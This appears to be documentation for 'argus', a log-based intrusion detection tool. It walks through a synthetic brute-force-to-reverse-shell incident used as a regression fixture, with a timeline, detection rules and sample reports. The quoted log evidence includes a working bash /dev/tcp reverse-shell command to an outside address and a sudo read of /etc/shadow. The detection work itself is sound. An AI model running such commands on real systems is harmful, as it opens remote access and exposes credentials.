# Scenario: from brute force to reverse shell

`examples/logs/attack/` is a synthetic but internally consistent incident. It is
small enough to read, but it exercises every parser, every correlation mode and
all 36 rules. The story spans one host, `web01`, with reconnaissance traffic
from `edge01`.

Use it to verify an installation or to see what the reports look like:

```console
argus scan examples/logs/attack --min-severity medium --year 2026
```

The corpus is fixed at 2026-11-10, so `--year 2026` makes the result
deterministic for the syslog-style records. The JSON-lines records carry their
own ISO timestamps.

## Timeline

| UTC | Stage | What happened | Rules that fire |
|---|---|---|---|
| 01:50 | Discovery | `45.155.205.233` contacts 24 distinct service ports on `10.0.0.30` from `edge01` | ARGUS-0024 |
| 02:00 | Password spraying | One source tries seven invalid usernames in two minutes | ARGUS-0001, ARGUS-0003 |
| 02:20 | Distributed brute force | Twelve failures against root from three source addresses | ARGUS-0002 |
| 02:30 | Initial access | `deploy` authenticates from `91.240.118.172` after repeated failures | ARGUS-0004 |
| 02:40 | Root login | A second successful root login from the spray source | ARGUS-0005 |
| 02:45 | Account persistence | `svc-backup` is created and added to `sudo` | ARGUS-0006, ARGUS-0007 |
| 02:48 | Privilege persistence | A passwordless sudoers entry is written | ARGUS-0009 |
| 02:49 | Privilege escalation | `su` to root succeeds | ARGUS-0036 |
| 02:50 | Execution | Sudo launches `/bin/bash -c id` | ARGUS-0008 |
| 02:52 | SSH persistence | An attacker key is appended to `authorized_keys` | ARGUS-0019 |
| 02:55 | Cron persistence | A cron job downloads and runs a remote script | ARGUS-0010, ARGUS-0011 |
| 02:57 | Systemd persistence | A service and a timer are enabled | ARGUS-0012, ARGUS-0013 |
| 02:59 | Defense evasion | `auditd` is stopped through systemd | ARGUS-0015, ARGUS-0028 |
| 03:00 | Defense evasion | The host firewall is disabled | ARGUS-0016 |
| 03:02 | Defense evasion | The authentication log is truncated | ARGUS-0014 |
| 03:03 | Defense evasion | PAM is changed to accept authentication unconditionally | ARGUS-0032 |
| 03:04 | Defense evasion | Shell history is deleted; USB storage is attached | ARGUS-0033, ARGUS-0030 |
| 03:05 | Credential access | `/etc/shadow` is read | ARGUS-0018 |
| 03:06 | Credential access | Cloud credentials are read | ARGUS-0031 |
| 03:07 | Privilege escalation | The SUID bit is set on a staged binary | ARGUS-0017 |
| 03:08 | Rootkit | A kernel module is loaded | ARGUS-0026 |
| 03:09 | Tooling | `netcat-openbsd` is installed through apt | ARGUS-0027 |
| 03:10 | Command and control | A reverse shell connects to `185.220.101.47:4444` | ARGUS-0020 |
| 03:11 | Tool transfer | `implant.sh` is downloaded over HTTP | ARGUS-0025 |
| 03:12 | Command and control | The host connects to the C2 address on port 4444 | ARGUS-0023 |
| 03:13 | Resource hijacking | `xmrig` starts from `/tmp/.cache` | ARGUS-0035 |
| 03:15 | Command and control | Ten small POST beacons to one public host and path | ARGUS-0021 |
| 03:20 | Collection | `deploy` reads five mailboxes in three minutes | ARGUS-0034 |
| 03:50 | Exfiltration | A 70 MB upload leaves the host | ARGUS-0022 |
| 03:55 | Impact | The host reboots | ARGUS-0029 |

Some events support more than one rule. The scan produces 43 alerts from the 36
rules because a few rules fire for more than one group or more than once.

## Reproduce the result

Count the alerts:

```console
$ argus scan examples/logs/attack --format jsonl --min-severity informational --year 2026 | wc -l
43
```

Confirm that every rule fired:

```console
$ argus scan examples/logs/attack --format jsonl --min-severity informational --year 2026 \
    | python -c 'import json,sys; print(len({json.loads(line)["rule_id"] for line in sys.stdin}))'
36
```

Show the severity breakdown:

```console
$ argus scan examples/logs/attack --min-severity medium --year 2026 | tail -25
  ATT&CK: T1114 Email Collection
  evidence (5 of 5 matched events):
    2026-11-10 03:20:05  jsonl   {"timestamp":"2026-11-10T03:20:05.100Z","host":"mail01","user":"deploy","action":"email_access","mailbox":"INBOX","messages":42,"bytes_in":1184200,"src_ip":"10.0.0.15"}  [examples/logs/attack/mail.jsonl:1]
    2026-11-10 03:20:35  jsonl   {"timestamp":"2026-11-10T03:20:35.200Z","host":"mail01","user":"deploy","action":"email_access","mailbox":"INBOX","messages":37,"bytes_in":992211,"src_ip":"10.0.0.15"}  [examples/logs/attack/mail.jsonl:2]
    2026-11-10 03:21:05  jsonl   {"timestamp":"2026-11-10T03:21:05.300Z","host":"mail01","user":"deploy","action":"email_access","mailbox":"Sent","messages":28,"bytes_in":684002,"src_ip":"10.0.0.15"}  [examples/logs/attack/mail.jsonl:3]
    2026-11-10 03:22:10  jsonl   {"timestamp":"2026-11-10T03:22:10.400Z","host":"mail01","user":"deploy","action":"email_access","mailbox":"Archive","messages":91,"bytes_in":2841120,"src_ip":"10.0.0.15"}  [examples/logs/attack/mail.jsonl:4]
    2026-11-10 03:23:15  jsonl   {"timestamp":"2026-11-10T03:23:15.500Z","host":"mail01","user":"deploy","action":"email_access","mailbox":"Archive","messages":64,"bytes_in":1720044,"src_ip":"10.0.0.15"}  [examples/logs/attack/mail.jsonl:5]

Summary
  critical 3  high 26  medium 11
  top rules:
    ARGUS-0008  Sudo used to spawn a shell  x3
    ARGUS-0015  Audit daemon or audit rules tampered with  x3
    ARGUS-0032  PAM authentication configuration modified  x2
    ARGUS-0017  SUID or SGID bit set on a file  x2
    ARGUS-0026  Kernel module loaded  x2
    ARGUS-0024  Network service discovery from one host  x1
    ARGUS-0001  SSH brute force from a single source  x1
    ARGUS-0003  SSH password spray across many accounts  x1
    ARGUS-0002  Distributed SSH brute force against one account  x1
    ARGUS-0004  SSH login succeeds after repeated failures  x1
  hosts:
    web01  x38
    edge01  x1
    mail01  x1
```

This excerpt starts mid-alert because the full report is long. The three
critical findings are:

```console
$ argus scan examples/logs/attack --min-severity critical --year 2026
argus 0.1.0  detection report
rules 36  |  events 108  |  files 5  |  malformed 0
window 2026-11-10 01:50:00 .. 2026-11-10 03:55:01 UTC

CRITICAL  ARGUS-0004  SSH login succeeds after repeated failures
  group: src_ip=91.240.118.172   logsource: linux/sshd
  first seen: 2026-11-10 02:20:20   last seen: 2026-11-10 02:30:14   count: 4
  ATT&CK: T1078 Valid Accounts; T1110.001 Password Guessing; T1021 Remote Services; T1021.004 SSH
  evidence (4 of 4 matched events):
    2026-11-10 02:20:20  sshd    Failed password for root from 91.240.118.172 port 40224 ssh2  [examples/logs/attack/auth.log:16]
    2026-11-10 02:20:30  sshd    Failed password for root from 91.240.118.172 port 40226 ssh2  [examples/logs/attack/auth.log:17]
    2026-11-10 02:20:40  sshd    Failed password for root from 91.240.118.172 port 40228 ssh2  [examples/logs/attack/auth.log:18]
    2026-11-10 02:30:14  sshd    Accepted password for deploy from 91.240.118.172 port 44322 ssh2  [examples/logs/attack/auth.log:27]

CRITICAL  ARGUS-0018  Shadow password file accessed
  group: host=web01   logsource: linux/auditd
  first seen: 2026-11-10 03:05:00   last seen: 2026-11-10 03:05:33   count: 2
  ATT&CK: T1003 OS Credential Dumping; T1552.001 Credentials In Files
  evidence (2 of 2 matched events):
    2026-11-10 03:05:00  auditd  item=0 name="/etc/shadow" inode=1832 dev=fd:01 mode=0100640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0  [examples/logs/attack/audit.log:2]
    2026-11-10 03:05:33  sshd    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow  [examples/logs/attack/auth.log:45]

CRITICAL  ARGUS-0020  Reverse shell command executed
  group: user=deploy   logsource: linux/auth
  first seen: 2026-11-10 03:10:28   last seen: 2026-11-10 03:10:28   count: 1
  ATT&CK: T1059 Command and Scripting Interpreter; T1059.004 Unix Shell
  evidence (1 of 1 matched events):
    2026-11-10 03:10:28  sshd    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1'  [examples/logs/attack/auth.log:50]

Summary
  critical 3
  top rules:
    ARGUS-0004  SSH login succeeds after repeated failures  x1
    ARGUS-0018  Shadow password file accessed  x1
    ARGUS-0020  Reverse shell command executed  x1
  hosts:
    web01  x3
```

## Use it in CI

The corpus is designed for a stable gate:

```console
argus scan examples/logs/attack --fail-on critical --year 2026 > /dev/null
argus scan examples/logs/benign --fail-on medium --year 2026 > /dev/null
```

The first command exits 1 because the attack corpus contains critical findings.
The second exits 0 because the benign corpus does not produce a medium-or-higher
alert. A regression in a parser, a rule or a correlation window changes one of
those outcomes.

## What the scenario does not cover

- Windows, macOS, cloud control-plane and container runtime logs.
- A real vulnerability exploit chain. Access is gained through credentials.
- Lateral movement to a second host. The scenario stays on `web01`, with edge
  reconnaissance on `edge01`.
- Data destruction. The final reboot is a low-severity impact event, not a
  wiper.

These gaps are deliberate. The corpus is a compact regression fixture, not a
claim of full ATT&CK coverage.
